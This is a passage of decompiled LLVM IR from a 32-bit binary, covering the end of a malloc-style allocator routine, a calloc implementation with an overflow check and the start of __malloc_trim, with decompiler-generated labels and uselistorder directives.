  %v1_806004b = load i32, i32* @esi, align 4
  %v2_806004b = sub i32 %v2_8060049, %v1_806004b
  store i32 %v2_806004b, i32* %eax.global-to-local, align 4
  %v0_806004d = load i32, i32* @global_var_807f488.742, align 8
  %v2_806004d = add i32 %v0_806004d, %v2_806004b
  store i32 %v2_806004d, i32* @global_var_807f488.742, align 8
  br label %dec_label_pc_8060053

dec_label_pc_8060053:                             ; preds = %dec_label_pc_8060011, %dec_label_pc_806003b
  %v0_806005846 = phi i32 [ %v1_8060016, %dec_label_pc_8060011 ], [ %v1_8060042, %dec_label_pc_806003b ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8060058

dec_label_pc_8060058:                             ; preds = %dec_label_pc_806001f, %dec_label_pc_8060037, %dec_label_pc_8060053
  %v0_806005d = phi i32 [ %v1_8060002, %dec_label_pc_806001f ], [ %v0_806005847, %dec_label_pc_8060037 ], [ %v0_806005846, %dec_label_pc_8060053 ]
  %v10_8060058 = icmp eq i32 %v0_806005d, -1
  br i1 %v10_8060058, label %dec_label_pc_80600c6, label %dec_label_pc_806005d

dec_label_pc_806005d:                             ; preds = %dec_label_pc_8060058
  %v1_806005d = load i32, i32* @edi, align 4
  %v2_806005d = sub i32 %v0_806005d, %v1_806005d
  store i32 %v2_806005d, i32* %edx.global-to-local, align 4
  %v1_806005f = load i32, i32* @esi, align 4
  %v2_806005f = add i32 %v1_806005f, %v2_806005d
  %v1_8060062 = or i32 %v2_806005f, 1
  store i32 %v1_8060062, i32* %eax.global-to-local, align 4
  store i32 %v1_806005d, i32* @global_var_807f14c.730, align 4
  %v2_806006b = add i32 %v1_806005d, 4
  %v3_806006b = inttoptr i32 %v2_806006b to i32*
  store i32 %v1_8060062, i32* %v3_806006b, align 4
  %v0_806006e = load i32, i32* @global_var_807f488.742, align 8
  %v1_806006e = load i32, i32* @esi, align 4
  %v2_806006e = add i32 %v1_806006e, %v0_806006e
  store i32 %v2_806006e, i32* @global_var_807f488.742, align 8
  br i1 %v2_805fece, label %dec_label_pc_80600c6, label %dec_label_pc_8060078

dec_label_pc_8060078:                             ; preds = %dec_label_pc_806005d
  store i32 %v0_805febe, i32* @ecx, align 4
  %v1_806007c = add i32 %v1_805fece, -12
  %v1_806007f = and i32 %v1_806007c, -8
  store i32 %v1_806007f, i32* %eax.global-to-local, align 4
  %v1_8060084 = or i32 %v1_806007f, 1
  store i32 %v1_8060084, i32* %edx.global-to-local, align 4
  %v5_8060087 = icmp ult i32 %v1_806007f, 15
  store i32 %v1_8060084, i32* %v2_805fec7, align 4
  %v0_806008d = load i32, i32* @ecx, align 4
  %v1_806008d = load i32, i32* %eax.global-to-local, align 4
  %v2_806008d = add i32 %v0_806008d, 4
  %v3_806008d = add i32 %v2_806008d, %v1_806008d
  %v4_806008d = inttoptr i32 %v3_806008d to i32*
  store i32 5, i32* %v4_806008d, align 4
  %v0_8060095 = load i32, i32* @ecx, align 4
  %v1_8060095 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060095 = add i32 %v0_8060095, 8
  %v3_8060095 = add i32 %v2_8060095, %v1_8060095
  %v4_8060095 = inttoptr i32 %v3_8060095 to i32*
  store i32 5, i32* %v4_8060095, align 4
  br i1 %v5_8060087, label %dec_label_pc_80600c6, label %dec_label_pc_806009f

dec_label_pc_806009f:                             ; preds = %dec_label_pc_8060078
  %v0_806009f = load i32, i32* @global_var_807f464.746, align 4
  store i32 %v0_806009f, i32* @ebx, align 4
  %v0_80600a5 = load i32, i32* @ecx, align 4
  %v1_80600aa = add i32 %v0_80600a5, 8
  store i32 %v1_80600aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80600aa, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_807f464.746, align 4
  %v1_80600b8 = call i32 @free(i32 %v1_80600aa)
  store i32 %v1_80600b8, i32* %eax.global-to-local, align 4
  %v0_80600c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80600c0, i32* @global_var_807f464.746, align 4
  br label %dec_label_pc_80600c6

dec_label_pc_80600c6:                             ; preds = %dec_label_pc_8060078, %dec_label_pc_806005d, %dec_label_pc_8060058, %dec_label_pc_805ff87, %dec_label_pc_806009f
  %v0_80600c6 = load i32, i32* @global_var_807f488.742, align 8
  %v0_80600cb = load i32, i32* @global_var_807f48c.747, align 4
  %v0_80600d7 = load i32, i32* @global_var_807f14c.730, align 4
  store i32 %v0_80600d7, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_80600c6, %v0_80600cb
  %v5_80600dd = select i1 %tmp89, i32 %v0_80600cb, i32 %v0_80600c6
  store i32 %v5_80600dd, i32* %edx.global-to-local, align 4
  %v1_80600e0 = load i32, i32* @global_var_807f484.741, align 4
  %v2_80600e0 = add i32 %v1_80600e0, %v0_80600c6
  store i32 %v5_80600dd, i32* @global_var_807f48c.747, align 4
  %v1_80600ec = load i32, i32* @global_var_807f494.743, align 4
  %tmp90 = icmp ule i32 %v2_80600e0, %v1_80600ec
  %v5_80600f2 = select i1 %tmp90, i32 %v1_80600ec, i32 %v2_80600e0
  store i32 %v5_80600f2, i32* %eax.global-to-local, align 4
  store i32 %v5_80600f2, i32* @global_var_807f494.743, align 4
  %v1_80600fe = add i32 %v0_80600d7, 4
  %v2_80600fe = inttoptr i32 %v1_80600fe to i32*
  %v3_80600fe = load i32, i32* %v2_80600fe, align 4
  %v1_8060101 = and i32 %v3_80600fe, -4
  store i32 %v1_8060101, i32* @ecx, align 4
  %v10_8060104 = icmp ult i32 %v1_8060101, %v1_805fd7e
  br i1 %v10_8060104, label %dec_label_pc_8060184, label %dec_label_pc_806010a

dec_label_pc_806010a:                             ; preds = %dec_label_pc_80600c6
  store i32 %v1_805fe06, i32* %esi.global-to-local, align 4
  %v2_8060110 = sub i32 %v1_8060101, %v1_805fe06
  store i32 %v2_8060110, i32* %ecx.global-to-local, align 4
  %v2_8060112 = add i32 %v0_80600d7, %v1_805fe06
  store i32 %v2_8060112, i32* %edx.global-to-local, align 4
  %v1_8060115 = or i32 %v1_805fe06, 1
  store i32 %v1_8060115, i32* %eax.global-to-local, align 4
  store i32 %v2_8060112, i32* @global_var_807f14c.730, align 4
  store i32 %v1_8060115, i32* %v2_80600fe, align 4
  %v0_8060121.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060121

dec_label_pc_8060121:                             ; preds = %dec_label_pc_805fd8c, %dec_label_pc_806010a
  %v0_8060121 = phi i32 [ %v5_805fd9f, %dec_label_pc_805fd8c ], [ %v0_8060121.pre, %dec_label_pc_806010a ]
  %v1_8060121 = or i32 %v0_8060121, 1
  store i32 %v1_8060121, i32* @ecx, align 4
  %v0_8060124 = load i32, i32* @ebx, align 4
  %v1_8060124 = add i32 %v0_8060124, 8
  store i32 %v1_8060124, i32* @ebx, align 4
  %v1_8060127 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060127 = add i32 %v1_8060127, 4
  %v3_8060127 = inttoptr i32 %v2_8060127 to i32*
  store i32 %v1_8060121, i32* %v3_8060127, align 4
  br label %dec_label_pc_8060191

dec_label_pc_806012c:                             ; preds = %dec_label_pc_805fb3e
  %v5_8060132 = sub i32 %v1_805fb21, %v1_805fe06
  store i32 %v5_8060132, i32* %eax.global-to-local, align 4
  %v2_8060136 = add i32 %v0_805fbec112, %v1_805fe06
  store i32 %v2_8060136, i32* %edx.global-to-local, align 4
  %v1_806013a = or i32 %v1_805fe06, 1
  store i32 %v2_8060136, i32* @global_var_807f150.731, align 16
  store i32 %v1_806013a, i32* %v2_805fb1b, align 4
  %v0_8060146 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060148 = or i32 %v0_8060146, 1
  store i32 %v1_8060148, i32* @ecx, align 4
  %v0_806014b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_806014b, i32* @global_var_807f15c.748, align 4
  store i32 %v0_806014b, i32* @global_var_807f160.733, align 32
  %v1_8060157 = add i32 %v0_806014b, 8
  %v2_8060157 = inttoptr i32 %v1_8060157 to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_8060157, align 4
  %v0_806015e = load i32, i32* %edx.global-to-local, align 4
  %v1_806015e = add i32 %v0_806015e, 12
  %v2_806015e = inttoptr i32 %v1_806015e to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_806015e, align 4
  %v0_8060165 = load i32, i32* @ecx, align 4
  %v1_8060165 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060165 = add i32 %v1_8060165, 4
  %v3_8060165 = inttoptr i32 %v2_8060165 to i32*
  store i32 %v0_8060165, i32* %v3_8060165, align 4
  %v0_8060168 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060168 = load i32, i32* %edx.global-to-local, align 4
  %v3_8060168 = add i32 %v1_8060168, %v0_8060168
  %v4_8060168 = inttoptr i32 %v3_8060168 to i32*
  store i32 %v0_8060168, i32* %v4_8060168, align 4
  br label %dec_label_pc_8060176

dec_label_pc_806016d:                             ; preds = %dec_label_pc_805fb4d
  store i32 %v1_805fe06, i32* %ebx.global-to-local, align 4
  %v0_8060171 = load i32, i32* @ebp, align 4
  %v2_8060171 = or i32 %v1_805fe06, 4
  %v3_8060171 = add i32 %v0_8060171, %v2_8060171
  %v4_8060171 = inttoptr i32 %v3_8060171 to i32*
  %v5_8060171 = load i32, i32* %v4_8060171, align 4
  %v6_8060171 = or i32 %v5_8060171, 1
  store i32 %v6_8060171, i32* %v4_8060171, align 4
  br label %dec_label_pc_8060176

dec_label_pc_8060176:                             ; preds = %dec_label_pc_806012c, %dec_label_pc_806016d
  %v0_8060176 = load i32, i32* @ebp, align 4
  %v1_8060176 = add i32 %v0_8060176, 8
  store i32 %v1_8060176, i32* @ebx, align 4
  br label %dec_label_pc_8060191

dec_label_pc_806017b:                             ; preds = %dec_label_pc_805fc3d
  %v1_806017b = load i32, i32* @ebx, align 4
  %v2_806017b = add i32 %v0_805fc49, 4
  %v3_806017b = add i32 %v2_806017b, %v1_806017b
  %v4_806017b = inttoptr i32 %v3_806017b to i32*
  %v5_806017b = load i32, i32* %v4_806017b, align 4
  %v6_806017b = or i32 %v5_806017b, 1
  store i32 %v6_806017b, i32* %v4_806017b, align 4
  br label %dec_label_pc_8060180

dec_label_pc_8060180:                             ; preds = %dec_label_pc_805fc55, %dec_label_pc_806017b
  %v0_8060180 = load i32, i32* @ecx, align 4
  store i32 %v0_8060180, i32* @ebx, align 4
  br label %dec_label_pc_8060191

dec_label_pc_8060184:                             ; preds = %dec_label_pc_805ff27, %dec_label_pc_80600c6, %dec_label_pc_805ff69, %dec_label_pc_805ff3f
  %v0_8060184 = load i32, i32* %stack_var_-92, align 4
  %v1_8060184 = call i32 @__errno_location(i32 %v0_8060184)
  store i32 %v1_8060184, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_806018b = inttoptr i32 %v1_8060184 to i32*
  store i32 12, i32* %v1_806018b, align 4
  br label %dec_label_pc_8060191

dec_label_pc_8060191:                             ; preds = %dec_label_pc_8060180, %dec_label_pc_8060176, %dec_label_pc_8060121, %dec_label_pc_805fdb7, %dec_label_pc_805fd69, %dec_label_pc_805fae8, %dec_label_pc_8060184
  store i32 %v2_805fa1f, i32* %eax.global-to-local, align 4
  store i32 %v2_805fa1f, i32* %stack_var_-92, align 4
  %v3_806019a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_806019a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80601a2

dec_label_pc_80601a2:                             ; preds = %dec_label_pc_805fa3d, %dec_label_pc_8060191
  %v0_80601a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80601a5, i32* %eax.global-to-local, align 4
  %v2_80601a7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80601a7, i32* @ebx, align 4
  store i32 %v0_805fa0c, i32* @esi, align 4
  store i32 %v0_805fa0b, i32* @edi, align 4
  store i32 %v0_805fa0a, i32* @ebp, align 4
  ret i32 %v0_80601a5

; uselistorder directives
  uselistorder i32 %v0_8060168, { 1, 0 }
  uselistorder i32 %v1_80600ec, { 1, 0 }
  uselistorder i32 %v2_80600e0, { 1, 0 }
  uselistorder i32 %v0_80600cb, { 1, 0 }
  uselistorder i32 %v0_80600c6, { 0, 2, 1 }
  uselistorder i32 %v1_806005d, { 1, 0, 2 }
  uselistorder i32 %v0_806005d, { 1, 0 }
  uselistorder i32 %v2_806004b, { 1, 0 }
  uselistorder i32 %v1_8060002, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805fff0, { 1, 0, 2 }
  uselistorder i32 %v2_805ffe0, { 1, 2, 0 }
  uselistorder i32 %v2_805ffdb, { 1, 0, 2 }
  uselistorder i32 %v1_805ffcb, { 2, 1, 0 }
  uselistorder i8 %v0_805ff99, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805ff7c, { 1, 0, 2 }
  uselistorder i32 %v0_806003e, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8060030, { 2, 0, 1 }
  uselistorder i32 %v8_805ff4c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_805ff32, { 1, 0, 2 }
  uselistorder i32 %v3_805ff32, { 1, 0 }
  uselistorder i32 %v1_805ff00, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805fef4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805fef0, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805fede, { 1, 0 }
  uselistorder i32 %v1_805fece, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_805febe, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_805fea7, { 1, 0 }
  uselistorder i32 %v2_805fe9b, { 1, 0 }
  uselistorder i32 %v2_805fe8b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_805fe6f, { 1, 2, 0 }
  uselistorder i32 %v1_805fe6f, { 1, 0, 2 }
  uselistorder i32 %v1_805fe6e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_805fe68, { 1, 0 }
  uselistorder i32 %v2_805fe46, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805fe3a, { 2, 1, 0 }
  uselistorder i32 %v8_805fe25, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_805fe0c, { 1, 0, 2 }
  uselistorder i32 %v0_805fdaf, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805fd7e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805fd71, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805fd57, { 1, 0, 2 }
  uselistorder i32 %v1_805fcf1, { 1, 0 }
  uselistorder i32 %v3_805fce6, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805fce0, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805fcdd12, { 1, 0 }
  uselistorder i32 %v2_805fcd2, { 1, 0 }
  uselistorder i32 %v1_805fcb6, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805fcb2, { 2, 1, 0 }
  uselistorder i32 %v1_805fcae, { 1, 0 }
  uselistorder i32 %v1_805fca9, { 2, 1, 0 }
  uselistorder i32 %v2_805fc98, { 1, 0 }
  uselistorder i32 %v1_805fc95, { 1, 2, 0, 3 }
  uselistorder i32 %v4_805fc33, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_805fc7e, { 1, 0 }
  uselistorder i32 %v0_805fc49, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805fc1f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805fbec, { 0, 2, 1 }
  uselistorder i32 %v2_805fbd0, { 1, 0 }
  uselistorder i32 %v1_805fbc6, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805fbc1.lcssa, { 1, 0 }
  uselistorder i32 %v3_805fbb1, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_805fba8, { 1, 0, 2 }
  uselistorder i32 %v3_805fb8b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_805fb84, { 1, 0, 2 }
  uselistorder i32 %v2_805fb6c, { 2, 1, 0 }
  uselistorder i32 %v0_805fb58, { 2, 1, 3, 0 }
  uselistorder i32 %v3_805fb1e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805fbec112, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805fbec107, { 1, 0, 2 }
  uselistorder i32 %v3_805facb, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805fabd, { 2, 1, 0 }
  uselistorder i32 %v2_805fa98, { 2, 1, 0 }
  uselistorder i8 %v0_805fa66, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805fe06, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_805fa4f, { 1, 2, 0 }
  uselistorder i32 %v0_805fa38, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 4, 8, 5, 0, 6, 7, 9, 10, 11, 12, 1, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_807f480.745, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 2 }
  uselistorder i32 134738260, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_807f160.733, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_807f14c.730 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807f14c.730 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80601a2, { 1, 0 }
  uselistorder label %dec_label_pc_8060191, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8060184, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8060180, { 1, 0 }
  uselistorder label %dec_label_pc_8060176, { 1, 0 }
  uselistorder label %dec_label_pc_8060121, { 1, 0 }
  uselistorder label %dec_label_pc_80600c6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8060058, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060053, { 1, 0 }
  uselistorder label %dec_label_pc_8060037, { 1, 0 }
  uselistorder label %dec_label_pc_805ffe0, { 1, 0 }
  uselistorder label %dec_label_pc_805ffc9, { 1, 0 }
  uselistorder label %dec_label_pc_805ffb2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805ff69, { 1, 0 }
  uselistorder label %dec_label_pc_805ff27, { 1, 0 }
  uselistorder label %dec_label_pc_805febe, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805fe5d, { 1, 0 }
  uselistorder label %dec_label_pc_805fd71, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fd69, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fcdd, { 1, 0 }
  uselistorder label %dec_label_pc_805fce2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805fcb6, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805fc3d, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_805fbc4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805fbad, { 1, 0 }
  uselistorder label %dec_label_pc_805fb1b, { 1, 0 }
  uselistorder label %dec_label_pc_805fbec.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fae8, { 1, 0 }
  uselistorder label %dec_label_pc_805fa66, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80601ac = load i32, i32* @edi, align 4
  %v0_80601ae = load i32, i32* @ebx, align 4
  %v12_80601af = ptrtoint i32* %stack_var_-28 to i32
  %v4_80601b2 = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_80601bc = sdiv i64 %sext, 4294967296
  %v3_80601bc = sext i32 %arg2 to i64
  %v4_80601bc = mul nsw i64 %v3_80601bc, %v2_80601bc
  %v5_80601bc = trunc i64 %v4_80601bc to i32
  store i32 %v5_80601bc, i32* @ebx, align 4
  %v2_80601bf = icmp eq i32 %v4_80601b2, 0
  br i1 %v2_80601bf, label %dec_label_pc_80601e1, label %dec_label_pc_80601c3

dec_label_pc_80601c3:                             ; preds = %entry
  store i32 %v4_80601b2, i32* @edi, align 4
  %div = udiv i32 %v5_80601bc, %v4_80601b2
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_80601cb = icmp eq i32 %div, %arg2
  br i1 %v12_80601cb, label %dec_label_pc_80601e1, label %dec_label_pc_80601cf

dec_label_pc_80601cf:                             ; preds = %dec_label_pc_80601c3
  %v1_80601cf = call i32 @__errno_location(i32 %v0_80601ae)
  store i32 %v1_80601cf, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80601d6 = inttoptr i32 %v1_80601cf to i32*
  store i32 12, i32* %v1_80601d6, align 4
  br label %dec_label_pc_8060297

dec_label_pc_80601e1:                             ; preds = %dec_label_pc_80601c3, %entry
  store i32 %v12_80601af, i32* %eax.global-to-local, align 4
  %v4_80601f1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  store i32 %v4_80601f1, i32* %eax.global-to-local, align 4
  %v1_80601fd = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  store i32 %v1_80601fd, i32* %eax.global-to-local, align 4
  %v0_8060202 = load i32, i32* @ebx, align 4
  %v1_8060205 = call i32 @malloc(i32 %v0_8060202)
  store i32 %v1_8060205, i32* %eax.global-to-local, align 4
  %v1_806020d = icmp eq i32 %v1_8060205, 0
  store i32 %v1_8060205, i32* @ebx, align 4
  br i1 %v1_806020d, label %dec_label_pc_8060286, label %dec_label_pc_8060213

dec_label_pc_8060213:                             ; preds = %dec_label_pc_80601e1
  %v1_8060213 = add i32 %v1_8060205, -4
  %v2_8060213 = inttoptr i32 %v1_8060213 to i32*
  %v3_8060213 = load i32, i32* %v2_8060213, align 4
  store i32 %v3_8060213, i32* %eax.global-to-local, align 4
  %v2_8060216 = and i32 %v3_8060213, 2
  %v3_8060216 = icmp eq i32 %v2_8060216, 0
  %v1_8060218 = icmp eq i1 %v3_8060216, false
  br i1 %v1_8060218, label %dec_label_pc_8060286, label %dec_label_pc_806021a

dec_label_pc_806021a:                             ; preds = %dec_label_pc_8060213
  %v1_806021a2 = add i32 %v3_8060213, -4
  %v1_806021d = and i32 %v1_806021a2, -4
  %v2_8060222 = udiv i32 %v1_806021d, 4
  store i32 %v2_8060222, i32* %eax.global-to-local, align 4
  %v5_8060225 = icmp ult i32 %v1_806021d, 36
  %tmp = and i32 %v1_806021a2, -4
  %tmp14 = icmp eq i32 %tmp, 36
  %v2_8060228 = or i1 %v5_8060225, %tmp14
  br i1 %v2_8060228, label %dec_label_pc_8060239, label %dec_label_pc_806022a

dec_label_pc_806022a:                             ; preds = %dec_label_pc_806021a
  %v3_806022f = inttoptr i32 %v1_8060205 to i8*
  %v4_806022f = call i32 @__GI_memset(i8* %v3_806022f, i32 0, i32 %v1_806021d)
  store i32 %v4_806022f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060286

dec_label_pc_8060239:                             ; preds = %dec_label_pc_806021a
  %v5_8060239 = icmp ult i32 %v1_806021d, 16
  %tmp15 = and i32 %v1_806021a2, -4
  %tmp16 = icmp eq i32 %tmp15, 16
  %v1_806023c = inttoptr i32 %v1_8060205 to i32*
  store i32 0, i32* %v1_806023c, align 4
  %v0_8060242 = load i32, i32* @ebx, align 4
  %v1_8060242 = add i32 %v0_8060242, 4
  %v2_8060242 = inttoptr i32 %v1_8060242 to i32*
  store i32 0, i32* %v2_8060242, align 4
  %v0_8060249 = load i32, i32* @ebx, align 4
  %v1_8060249 = add i32 %v0_8060249, 8
  %v2_8060249 = inttoptr i32 %v1_8060249 to i32*
  store i32 0, i32* %v2_8060249, align 4
  %v2_8060250 = or i1 %v5_8060239, %tmp16
  br i1 %v2_8060250, label %dec_label_pc_8060286, label %dec_label_pc_8060252

dec_label_pc_8060252:                             ; preds = %dec_label_pc_8060239
  %v0_8060252 = load i32, i32* %eax.global-to-local, align 4
  %v0_8060255 = load i32, i32* @ebx, align 4
  %v1_8060255 = add i32 %v0_8060255, 12
  %v2_8060255 = inttoptr i32 %v1_8060255 to i32*
  store i32 0, i32* %v2_8060255, align 4
  %v0_806025c = load i32, i32* @ebx, align 4
  %v1_806025c = add i32 %v0_806025c, 16
  %v2_806025c = inttoptr i32 %v1_806025c to i32*
  store i32 0, i32* %v2_806025c, align 4
  %tmp17 = icmp ult i32 %v0_8060252, 7
  br i1 %tmp17, label %dec_label_pc_8060286, label %dec_label_pc_8060265

dec_label_pc_8060265:                             ; preds = %dec_label_pc_8060252
  %v0_8060265 = load i32, i32* %eax.global-to-local, align 4
  %v0_8060268 = load i32, i32* @ebx, align 4
  %v1_8060268 = add i32 %v0_8060268, 20
  %v2_8060268 = inttoptr i32 %v1_8060268 to i32*
  store i32 0, i32* %v2_8060268, align 4
  %v0_806026f = load i32, i32* @ebx, align 4
  %v1_806026f = add i32 %v0_806026f, 24
  %v2_806026f = inttoptr i32 %v1_806026f to i32*
  store i32 0, i32* %v2_806026f, align 4
  %tmp18 = icmp ult i32 %v0_8060265, 9
  br i1 %tmp18, label %dec_label_pc_8060286, label %dec_label_pc_8060278

dec_label_pc_8060278:                             ; preds = %dec_label_pc_8060265
  %v0_8060278 = load i32, i32* @ebx, align 4
  %v1_8060278 = add i32 %v0_8060278, 28
  %v2_8060278 = inttoptr i32 %v1_8060278 to i32*
  store i32 0, i32* %v2_8060278, align 4
  %v0_806027f = load i32, i32* @ebx, align 4
  %v1_806027f = add i32 %v0_806027f, 32
  %v2_806027f = inttoptr i32 %v1_806027f to i32*
  store i32 0, i32* %v2_806027f, align 4
  br label %dec_label_pc_8060286

dec_label_pc_8060286:                             ; preds = %dec_label_pc_8060265, %dec_label_pc_8060252, %dec_label_pc_8060239, %dec_label_pc_8060213, %dec_label_pc_80601e1, %dec_label_pc_806022a, %dec_label_pc_8060278
  store i32 %v12_80601af, i32* %eax.global-to-local, align 4
  %v3_806028f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_806028f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060297

dec_label_pc_8060297:                             ; preds = %dec_label_pc_80601cf, %dec_label_pc_8060286
  %v0_806029a = load i32, i32* @ebx, align 4
  store i32 %v0_806029a, i32* %eax.global-to-local, align 4
  store i32 %v0_80601ae, i32* @ebx, align 4
  store i32 %v0_80601ac, i32* @edi, align 4
  ret i32 %v0_806029a

; uselistorder directives
  uselistorder i32 %v1_806021d, { 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060297, { 1, 0 }
  uselistorder label %dec_label_pc_8060286, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_80602a1 = load i32, i32* @edx, align 4
  store i32 %v0_80602a1, i32* %ebp.global-to-local, align 4
  %v0_80602a4 = load i32, i32* @esi, align 4
  %v0_80602a5 = load i32, i32* @ebx, align 4
  %v1_80602a9 = add i32 %v0_80602a1, 860
  %v2_80602a9 = inttoptr i32 %v1_80602a9 to i32*
  %v3_80602a9 = load i32, i32* %v2_80602a9, align 4
  store i32 %v3_80602a9, i32* @ecx, align 4
  %v1_80602af = add i32 %v0_80602a1, 44
  %v2_80602af = inttoptr i32 %v1_80602af to i32*
  %v3_80602af = load i32, i32* %v2_80602af, align 4
